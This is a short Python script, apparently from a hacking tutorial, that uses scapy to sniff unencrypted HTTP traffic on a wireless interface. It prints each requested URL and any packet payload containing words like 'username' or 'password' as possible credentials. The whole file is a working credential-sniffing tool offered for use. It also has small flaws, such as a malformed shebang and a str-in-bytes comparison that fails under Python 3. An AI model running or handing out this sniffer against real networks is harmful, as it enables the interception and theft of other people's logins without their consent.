#To check packets data in terminal in http protocol not on httpS
#!usr/bin/env python
import scapy.all as scapy
from scapy.layers.http import HTTPRequest

#interface got by ifconfig command,prn takes function which would be execute
def sniff(interface):
    # scapy.sniff(iface=interface, store=False,prn=process_sniff_packet, filter="port 21")
    # scapy.sniff(iface=interface, store=False,prn=process_sniff_packet, filter="tcp")
    scapy.sniff(iface=interface, store=False,prn=process_sniffed_packet)

def get_url(packet):
    url = packet[HTTPRequest].Host + packet[HTTPRequest].Path
    return url
def get_login_info(packet):
        if packet.haslayer(scapy.Raw):

            # it will show whole Raw layer,it will show all requests including POST,GET
            # print(packet[scapy.Raw].show())

            # it will show only attribute "load" of "Raw layer"
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load



def process_sniffed_packet(packet):
    if packet.haslayer(HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

sniff("wlp1s0")